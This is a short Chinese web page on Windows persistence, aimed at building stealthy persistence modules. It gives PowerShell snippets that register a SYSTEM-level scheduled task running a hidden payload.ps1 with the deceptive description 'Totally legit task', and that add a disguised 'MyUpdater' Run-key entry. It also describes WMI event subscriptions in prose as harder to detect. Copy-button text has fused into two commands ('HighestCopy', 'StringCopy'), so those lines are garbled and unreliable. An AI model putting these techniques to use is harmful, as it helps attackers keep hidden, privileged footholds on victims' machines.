# windows持久化

This is the content for Sub Sidebar 1 under Sidebar 1.

多种持久化技术，隐蔽持久模块开发


* **计划任务** ：创建一个任务，定期或在特定触发器（如用户登录或系统启动）时运行载荷。

<pre><section><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="45" height="12" viewBox="0 0 450 130" role="img" aria-label="插图"><ellipse cx="65" cy="65" rx="50" ry="52" stroke="rgb(220,60,54)" stroke-width="2" fill="rgb(237,108,96)"></ellipse><ellipse cx="225" cy="65" rx="50" ry="52" stroke="rgb(218,151,33)" stroke-width="2" fill="rgb(247,193,81)"></ellipse><ellipse cx="385" cy="65" rx="50" ry="52" stroke="rgb(27,161,37)" stroke-width="2" fill="rgb(100,200,86)"></ellipse></svg></section><code><span leaf=""># 示例：创建一个每天上午 9 点运行脚本的任务</span><span leaf=""><br/></span><span leaf="">$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\path\to\your\payload.ps1"</span><span leaf=""><br/></span><span leaf="">$Trigger = New-ScheduledTaskTrigger -Daily -At 9am</span><span leaf=""><br/></span><span leaf=""># 注册任务以 SYSTEM 身份运行，具有最高权限</span><span leaf=""><br/></span><span leaf="">Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "MyPersistenceTask" -Description "Totally legit task." -User "SYSTEM" -RunLevel HighestCopy</span><span leaf=""><br/></span></code></pre>

* **注册表运行键** ：向 `<span leaf="">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span>`（用户登录）或 `<span leaf="">HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span>`（系统启动，需要管理员权限）等键添加条目。

<pre><section><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="45" height="12" viewBox="0 0 450 130" role="img" aria-label="插图"><ellipse cx="65" cy="65" rx="50" ry="52" stroke="rgb(220,60,54)" stroke-width="2" fill="rgb(237,108,96)"></ellipse><ellipse cx="225" cy="65" rx="50" ry="52" stroke="rgb(218,151,33)" stroke-width="2" fill="rgb(247,193,81)"></ellipse><ellipse cx="385" cy="65" rx="50" ry="52" stroke="rgb(27,161,37)" stroke-width="2" fill="rgb(100,200,86)"></ellipse></svg></section><code><span leaf=""># 示例：为当前用户添加运行键条目</span><span leaf=""><br/></span><span leaf="">New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyUpdater" -Value "powershell.exe -WindowStyle Hidden -File C:\path\to\your\payload.ps1" -PropertyType StringCopy</span><span leaf=""><br/></span></code></pre>

* **WMI 事件订阅** ：一种更隐蔽的技术，你创建一个 WMI 事件过滤器（例如监控系统正常运行时间）和一个消费者，当事件发生时执行你的 PowerShell 代码。这更复杂，但通常比标准的运行键或计划任务更难检测。
